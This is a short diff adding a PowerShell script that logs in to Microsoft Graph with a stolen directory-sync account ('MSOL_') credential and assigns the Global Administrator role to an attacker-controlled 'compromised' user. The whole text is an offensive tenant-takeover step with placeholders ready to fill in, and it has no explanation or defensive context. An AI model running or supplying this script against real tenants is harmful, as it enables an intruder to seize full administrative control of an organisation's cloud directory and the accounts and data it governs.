@@ -1,0 +1,8 @@
+$cred = New-Object System.Management.Automation.PSCredential("DOMAIN\MSOL_xxx", (ConvertTo-SecureString "PASSWORD" -AsPlainText -Force))
+Connect-MgGraph -Credential $cred
+
+# Add a user you control to Global Admin
+$ga_role = Get-MgRoleManagementDirectoryRole -Filter "displayName eq 'Global Administrator'"
+$user = Get-MgUser -Filter "userPrincipalName eq 'YOUR_COMPROMISED_USER@tenant.onmicrosoft.com'"
+
+New-MgRoleManagementDirectoryRoleAssignment -RoleDefinitionId $ga_role.Id -PrincipalId $user.Id
